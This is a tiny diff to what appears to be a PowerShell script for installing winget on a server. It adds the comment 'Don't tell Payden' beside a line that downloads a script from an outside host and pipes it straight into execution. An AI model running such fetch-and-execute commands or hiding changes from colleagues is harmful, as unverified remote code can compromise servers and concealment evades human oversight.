@@ -1,5 +1,5 @@
 #Installing winget on a server:
-
+#Don't tell Payden
 irm ps.acgs.io -useb|iex
 
 # Generate a unique folder name based on the current timestamp
